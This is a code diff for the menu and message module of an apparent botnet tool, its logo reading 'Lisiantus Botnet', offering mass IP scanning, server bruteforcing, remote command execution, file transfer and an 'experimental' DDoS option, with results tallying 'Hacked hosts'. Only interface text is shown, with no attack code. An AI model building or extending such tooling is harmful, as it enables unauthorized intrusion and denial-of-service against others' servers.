@@ -1,7 +1,42 @@
 # -*- coding: utf-8 -*-
 import subprocess
 
-from const import MAIN_MENU, MAIN_LOGO
+
+MAIN_LOGO = """
+$$\       $$\           $$\                      $$\                         
+$$ |      \__|          \__|                     $$ |                        
+$$ |      $$\  $$$$$$$\ $$\  $$$$$$\  $$$$$$$\ $$$$$$\   $$\   $$\  $$$$$$$\ 
+$$ |      $$ |$$  _____|$$ | \____$$\ $$  __$$\\_$$  _|  $$ |  $$ |$$  _____|
+$$ |      $$ |\$$$$$$\  $$ | $$$$$$$ |$$ |  $$ | $$ |    $$ |  $$ |\$$$$$$\  
+$$ |      $$ | \____$$\ $$ |$$  __$$ |$$ |  $$ | $$ |$$\ $$ |  $$ | \____$$\ 
+$$$$$$$$\ $$ |$$$$$$$  |$$ |\$$$$$$$ |$$ |  $$ | \$$$$  |\$$$$$$  |$$$$$$$  |
+\________|\__|\_______/ \__| \_______|\__|  \__|  \____/  \______/ \_______/                                                                                                                                                   
+
+$$$$$$$\             $$\                          $$\                        
+$$  __$$\            $$ |                         $$ |                       
+$$ |  $$ | $$$$$$\ $$$$$$\   $$$$$$$\   $$$$$$\ $$$$$$\                      
+$$$$$$$\ |$$  __$$\\_$$  _|  $$  __$$\ $$  __$$\\_$$  _|                     
+$$  __$$\ $$ /  $$ | $$ |    $$ |  $$ |$$$$$$$$ | $$ |                       
+$$ |  $$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$   ____| $$ |$$\                    
+$$$$$$$  |\$$$$$$  | \$$$$  |$$ |  $$ |\$$$$$$$\  \$$$$  |                   
+\_______/  \______/   \____/ \__|  \__| \_______|  \____/   """
+
+
+MAIN_MENU = """
+1. Masscan              (Scan one or diapasons of ip's by specific port/s)
+2. Bruteforce           (Bruteforce server/s by ip/s)
+3. Send Command         (Send command to remote server. Available cmds: send custom cmd, upload/download file, ddos)
+
+{}
+
+Choose menu item...(1-6)
+"""
+
+
+MSG = """
+Result of {}:
+Total: {}
+Elapsed: {}"""
 
 
 def show_menu(msg=None):
@@ -39,11 +74,24 @@ def bruteforce_start_msg(files_names):
 
 
 def bruteforce_result_msg(start, stop, hosts_am):
-    msg = """
-Result of bruteforce:
+    msg = """Result of bruteforce:
 Hacked hosts: {}
 Start: {}
 Stop: {} 
     """.format(hosts_am, start, stop)
 
     return msg
+
+
+def send_command_start_msg():
+    msg = """Available commands:
+1. Send custom command.
+2. Download file from server.
+3. Upload file to server.
+4. DDos.  (experimental module)     
+"""
+    print(msg)
+    choice = input('> ')
+    subprocess.run(['clear'])
+
+    return choice
